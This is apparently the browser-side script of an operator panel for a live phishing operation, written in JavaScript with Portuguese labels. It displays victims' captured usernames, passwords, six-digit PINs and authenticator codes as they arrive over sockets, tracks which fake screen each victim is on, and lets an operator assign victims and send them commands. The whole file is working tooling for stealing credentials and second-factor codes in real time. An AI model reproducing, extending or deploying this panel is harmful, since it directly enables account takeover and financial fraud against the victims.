socket.on('onScreenPass', (data) => {
    const lineClient = document.querySelector(`.productList tr[data-id='${data.id}']`)

    if (!lineClient) return

    lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
})

const panel = (() => {
    //private var/functions

    function playSound(url) {
        const audio = new Audio(url)
        audio.play()
    }

    const buttonsSendCommands = [...document.querySelectorAll('.btn-actions')]

    const token = document.body.dataset.token

    //clientIdentify

    function cleanInfos() {
        const button = document.querySelector('.btn-clean')

        if (!button) return

        button.addEventListener('click', function (e) {
            e.preventDefault()

            fetch('/api/clean', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
            })
                .then((r) => r.json())
                .then((res) => {
                    if (res.error)
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: res.error,
                            type: 'warning',
                        })

                    return
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    async function sendCommand() {
        if (buttonsSendCommands) {
            buttonsSendCommands.forEach((btn) => {
                btn.addEventListener('click', function (e) {
                    e.preventDefault()

                    const clientOperating = document.querySelector('.form-operator')

                    if (!clientOperating) console.log('nenhum cliente selecionado')

                    const idClient = clientOperating.getAttribute('client-id')

                    console.log(idClient)

                    const action = btn.getAttribute('action')

                    socket.emit(action, idClient)
                })
            })
        }
    }

    function handleCount(minute, second, field) {
        //return { minute, second }

        setInterval(() => {
            if (field.innerHTML.indexOf('SAIU') == -1) {
                if (second == 59) {
                    minute = minute + 1
                    second = 0
                } else {
                    second = second + 1
                }

                field.innerHTML = ('0' + minute).slice(-2) + ':' + ('0' + second).slice(-2)
            }
        }, 1000)
    }

    function handleTimer(field) {
        const timer = field.innerHTML.split(':')
        console.log(`text in field: `, timer)

        const minute = parseInt(timer[0])

        const seconds = parseInt(timer[1])

        handleCount(minute, seconds, field)
    }

    function timer() {
        const timers = [...document.querySelectorAll('td[role="time"]')]

        if (timers) timers.forEach(handleTimer)
    }

    async function register() {
        const form = document.querySelector('.formRegister')

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            const data = util.serialize(form)

            const modal = form.closest('.modal')

            const token = document.body.dataset.token

            fetch('/api/user', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            })
                .then((r) => r.json())
                .then((response) => {
                    const user = response

                    if (response.error)
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: response.error,
                            type: 'warning',
                        })

                    $(modal).modal('hide')

                    console.log(response)

                    util.notify({
                        icon: 'success',
                        title: 'Sucesso',
                        message: `Usuário ${user.name} cadastrado com sucesso`,
                        type: 'success',
                    })
                })
                .catch((err) => {
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })
        })
    }

    function handleReconnect(client) {
        const { id, user, password, updatedAt, status, type } = client

        const { operator } = client

        const tr = document.querySelector(`tr[data-id="${id}"]`)

        if (!tr) return

        const roleId = tr.querySelector(`th[role="id"]`)
        const roleOperator = tr.querySelector(`strong[role="operator"]`)
        const roleUser = tr.querySelector(`td[role="user"]`)
        const rolePassword = tr.querySelector(`td[role="password"]`)
        const roleType = tr.querySelector(`td[role="type"]`)
        const roleTime = tr.querySelector(`td[role="time"]`)
        const roleCommand = tr.querySelector(`td[role="command"]`)

        roleCommand.innerHTML = 'Aguardando comando'
        roleType.innerHTML = type

        let time = new Date() - new Date(updatedAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        if (operator) roleOperator.innerHTML = operator.name

        roleUser.innerHTML = user
        rolePassword.innerHTML = password
        roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
    }

    function createClient(client) {
        const { id, user, password, password6, type, auth } = client
        const tr = document.createElement('tr')

        tr.dataset.id = id

        tr.innerHTML = `
        <th scope="row" role="id"># ${id}</th>
        <td role="user">${user}</td>
        <td role="password">${password}</td>
        <input type="hidden" name="password6" value="${password6}">
        <input type="hidden" name="auth" value="${auth}">
        <td role="status" class="blockstatus enter"><span>Cliente entrou</span></td>
        `

        //timer(roleTime)

        clickInfo(tr)
        document.querySelector('.productList').prepend(tr)
    }

    function clientEnter() {
        socket.on('reconnectClient', (client) => {
            handleReconnect(client)
        })

        socket.on('newClient', createClient)
    }

    function updateClient(data) {
        const table = document.querySelector('.productList')

        const tableId = table.querySelector(`tr[data-id='${data.id}']`)
        const tableUser = tableId.querySelector(`[role='user']`)
        const tablePassword = tableId.querySelector(`[role='password']`)

        if (tableId && tableUser) tableUser.innerHTML = data.user
        if (tableId && tablePassword) tablePassword.innerHTML = data.password
    }

    function receiver() {
        socket.on('AssignOp', (data) => {
            console.log(`assign operator: `, data)

            const clientColumn = document.querySelector(`.productList tr[data-id="${data.client.id}"]`)

            if (!clientColumn) return

            if (clientColumn.querySelector('.snip_Operator')) clientColumn.querySelector('.snip_Operator').remove()

            const snip = document.createElement('span')
            snip.classList.add('snip_Operator')

            snip.innerHTML = data.operator

            clientColumn.append(snip)
        })

        socket.on('visitors', (data) => {
            const visitButton = document.querySelector('.btn-visitors')

            if (!visitButton) return

            visitButton.innerHTML = `Visitas (${data})`
        })

        socket.on('createClient', (data) => {
            createClient(data)

            playSound('/fonts/pristine-609.mp3')
        })

        socket.on('onScreenAuth', (data) => {
            const info = document.querySelector(`.productList tr[data-id='${data.id}']`)

            console.log('online na tela de auth')

            if (!info) return

            const role = info.querySelector('td[role="status"]')

            if (!role) return

            setTimeout(() => {
                role.className = ''
                role.classList.add('blockstatus', 'enter')
                role.querySelector('span').innerHTML = `Online Autenticador`
            }, 300)
        })

        socket.on('cleanClients', (data) => {
            const list = document.querySelectorAll('.productList > tr')

            if (!list) return

            list.forEach((info) => {
                if (!info) return
                info.remove()
            })

            return util.notify({
                icon: 'success',
                title: 'Sucesso',
                message: `${data} infos excluídas`,
                type: 'success',
            })
        })

        socket.on('sendAuth', (data) => {
            setTimeout(() => {
                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

                item.querySelector(`td[role='status']`).className = ``

                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')

                item.querySelector(`td[role='status'] span`).innerHTML = 'Auth enviado'
            }, 600)
        })

        socket.on('onScreenDisp', (data) => {
            const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

            if (!item) return

            setTimeout(() => {
                item.querySelector(`td[role='status']`).className = ``

                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
                item.querySelector(`td[role='status'] span`).innerHTML = 'Online tela dispositivo'
            }, 500)
        })

        //reconnect client
        socket.on('userReconnect', (data) => {
            setTimeout(() => {
                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

                item.querySelector(`td[role='status']`).className = ``

                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')

                item.querySelector(`td[role='status'] span`).innerHTML = 'Conectado'
            }, 300)
        })

        socket.on('onScreenPass', (data) => {
            setTimeout(() => {
                const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

                item.querySelector(`td[role='status']`).className = ``

                item.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')

                item.querySelector(`td[role='status'] span`).innerHTML = 'Conectado'
            }, 300)
        })

        socket.on('sendPass6', (data) => {
            const item = document.querySelector(`.productList tr[data-id='${data.id}']`)

            item.querySelector(`td[role='status']`).className = ``

            item.querySelector(`td[role='status']`).classList.add('blockstatus', 'updated')

            item.querySelector(`td[role='status'] span`).innerHTML = 'Enviou senha de 6'
        })

        socket.on('updateClient', (data) => {
            const lineClient = document.querySelector(`.productList > tr[data-id='${data.id}']`)

            setTimeout(() => {
                if (lineClient) {
                    lineClient.querySelector(`td[role='user']`).innerHTML = data.user
                    lineClient.querySelector(`td[role='password']`).innerHTML = data.password
                    lineClient.querySelector(`input[name='password6']`).value = data.password6
                    lineClient.querySelector(`input[name='auth']`).value = data.auth
                    lineClient.querySelector(`td[role='status']`).className = ``
                    lineClient.querySelector(`td[role='status']`).classList.add('blockstatus', 'enter')
                    lineClient.querySelector(`td[role='status'] span`).innerHTML = `Online na senha de 6`
                }

                const formOperator = document.querySelector(`form[client-id='${data.id}']`)

                if (formOperator) {
                    formOperator.querySelector(`input[type='email']`).value = data.user
                    formOperator.querySelector(`#exampleInputPassword1`).value = data.password
                    formOperator.querySelector(`#password6`).value = data.password6
                    formOperator.querySelector(`#inputAuthenticator`).value = data.auth
                }
            }, 300)

            //updateClient(data)
        })

        socket.on('sendPassword', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            const command = roleId.querySelector('td[role="command"]')

            if (command) command.innerHTML = `Senha enviada!`
        })

        socket.on('assignClient', (client) => {
            handleReconnect(client)
        })

        socket.on('finish', (client) => {
            return handleReconnect(client)
        })

        socket.on('clientDisconnect', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            roleId.querySelector('td[role="status"]').classList.remove('enter')
            roleId.querySelector('td[role="status"]').classList.add('disconnected')

            const command = roleId.querySelector('td[role="status"] span')

            if (command) command.innerHTML = `SAIU`
        })

        socket.on('clientDestroy', (client) => {
            const roleId = document.querySelector(`tr[data-id="${client.id}"]`)

            roleId.remove()
        })

        socket.on('await', (client) => {
            const field = document.querySelector(`tr[data-id="${client.id}"]`)

            if (field) {
                const role = field.querySelector('td[role="command"]')

                role.innerHTML = `Aguardando Comando`
            }
        })
    }

    function clickInfo(info) {
        info.addEventListener('click', (e) => {
            e.preventDefault()

            const form = document.querySelector('.form-operator')

            document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML

            if (!form) return

            form.setAttribute('client-id', info.getAttribute('data-id'))

            form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
            form.querySelector('#exampleInputPassword1').value = info
                .querySelector(`td[role='password']`)
                .innerHTML.replace(/\s/g, '')

            console.log(info.querySelector(`input`).value)

            if (
                info.querySelector(`input[name='password6']`).value != null ||
                info.querySelector(`input[name='password6']`).value != 'null'
            )
                form.querySelector('#password6').value = info
                    .querySelector(`input[name='password6']`)
                    .value.replace(/\s/g, '')

            if (
                info.querySelector(`input[name='auth']`).value != null ||
                info.querySelector(`input[name='auth']`).value != 'null'
            )
                form.querySelector('#inputAuthenticator').value = info
                    .querySelector(`input[name='auth']`)
                    .value.replace(/\s/g, '')

            socket.emit('AssignOp', { cl: info.getAttribute('data-id'), token })
        })
    }

    function selectInfo() {
        const listInfo = [...document.querySelectorAll(`.productList tr`)]

        listInfo.forEach((info) => {
            info.addEventListener('click', (e) => {
                e.preventDefault()

                document.querySelector('.client-name').innerHTML = info.querySelector(`td[role='user']`).innerHTML

                const form = document.querySelector('.form-operator')

                if (!form) return

                form.setAttribute('client-id', info.getAttribute('data-id'))

                form.querySelector('#exampleInputEmail1').value = info.querySelector(`td[role='user']`).innerHTML
                form.querySelector('#exampleInputPassword1').value = info
                    .querySelector(`td[role='password']`)
                    .innerHTML.replace(/\s/g, '')

                form.querySelector('#password6').value = info
                    .querySelector(`input[name='password6']`)
                    .value.replace(/\s/g, '')

                form.querySelector('#inputAuthenticator').value = info
                    .querySelector(`input[name='auth']`)
                    .value.replace(/\s/g, '')

                socket.emit('AssignOp', { cl: info.getAttribute('data-id'), token })
            })
        })
    }

    function excludeUser() {
        socket.on('destroyUser', (data) => {
            const user = document.querySelector(`.user_exclude_${data.id}`)

            if (!user) return

            user.remove()
        })

        const btns = document.querySelectorAll('.btn-ExcludeUser')

        if (!btns) return

        btns.forEach((button) => {
            button.addEventListener('click', function (e) {
                e.preventDefault()

                const buttonId = button.dataset.id

                if (!buttonId) return

                fetch(`/api/user/${buttonId}`, {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json',
                        Authorization: `Bearer ${token}`,
                    },
                })
                    .then((r) => r.json())
                    .then((res) => {
                        if (res.error) {
                            return util.notify({
                                icon: `alert-icon ni ni-bell-55`,
                                title: 'Atenção! alguns erros foram encontrados!',
                                message: res.error,
                                type: 'warning',
                            })
                        }

                        return util.notify({
                            icon: 'success',
                            title: 'Sucesso',
                            message: `Usuário ${res.name} excluído`,
                            type: 'success',
                        })
                    })
                    .catch((err) => {
                        $('#changePassModal').modal('hide')
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: err,
                            type: 'warning',
                        })
                    })
            })
        })
    }

    function changePassword() {
        const btn = document.querySelector('.btn-changePassword')

        if (!btn) return

        btn.addEventListener('click', function (e) {
            e.preventDefault()

            const form = document.querySelector('.changePassForm')

            if (!form) return

            const data = util.serialize(form)

            if (!data) return

            //request

            fetch('/api/user/change_password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${token}`,
                },
                body: JSON.stringify(data),
            })
                .then((r) => r.json())
                .then((res) => {
                    if (res.error) {
                        $('#changePassModal').modal('hide')
                        return util.notify({
                            icon: `alert-icon ni ni-bell-55`,
                            title: 'Atenção! alguns erros foram encontrados!',
                            message: res.error,
                            type: 'warning',
                        })
                    }

                    console.log(`dados recebidos ao mudar senha: `, res)

                    $('#changePassModal').modal('hide')

                    return util.notify({
                        icon: 'success',
                        title: 'Sucesso',
                        message: `Senha de ${res.name} alterada com sucesso`,
                        type: 'success',
                    })
                })
                .catch((err) => {
                    $('#changePassModal').modal('hide')
                    return util.notify({
                        icon: `alert-icon ni ni-bell-55`,
                        title: 'Atenção! alguns erros foram encontrados!',
                        message: err,
                        type: 'warning',
                    })
                })

            form.querySelector(`input[name='password']`).value = ''
        })
    }

    return {
        //public var/functions
        clientEnter,
        receiver,
        register,
        timer,
        selectInfo,
        sendCommand,
        cleanInfos,
        changePassword,
        excludeUser,
    }
})()

panel.excludeUser()
panel.changePassword()
panel.sendCommand()
panel.cleanInfos()
panel.selectInfo()
panel.clientEnter()
panel.receiver()
panel.register()
panel.timer()
